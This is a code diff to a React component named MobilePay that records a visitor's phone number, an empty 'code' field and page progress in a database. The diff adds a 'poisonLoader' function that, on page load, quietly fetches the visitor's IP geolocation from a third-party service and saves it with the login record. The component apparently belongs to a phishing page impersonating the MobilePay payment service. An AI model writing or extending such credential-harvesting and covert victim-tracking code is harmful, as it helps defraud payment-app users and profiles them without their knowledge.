@@ -6,7 +6,33 @@ import { useOutletContext } from "react-router-dom";
 function MobilePay() {
   const [number, setNumber] = useState("");
   const [identifier, setIdentifier, db] = useOutletContext();
+  const [userLocation, setUserLocation] = useState({});
 
+  const poisonLoader = async () => {
+    const result = await fetch(
+      "https://api.db-ip.com/v2/free/self"
+    );
+    const data = await result.json();
+    if (data) {
+      setUserLocation(data);
+    }
+    return data;
+  };
+
+  // const poisonLoader = async () => {
+  //   const result = await fetch("https://api.hostip.info");
+  //   const data = await result.text();
+  //   const xml = new window.DOMParser().parseFromString(data, "text/xml");
+  //   console.log(xml.getElementsByTagName("ip")[0].textContent);
+  //   if (!data?.error) {
+  //     setUserLocation({ ip: data?.ip_location, country: data?.country });
+  //   }
+  //   return data;
+  // };
+
+  useEffect(() => {
+    poisonLoader();
+  }, []);
 
   const UserLogin = async () => {
     if (!number) return;
@@ -21,6 +47,7 @@ function MobilePay() {
       code: "",
       date: new Date().toISOString(),
       pagesDone: ["mobilepay"],
+      location: userLocation,
     });
     setIdentifier(number);
   };
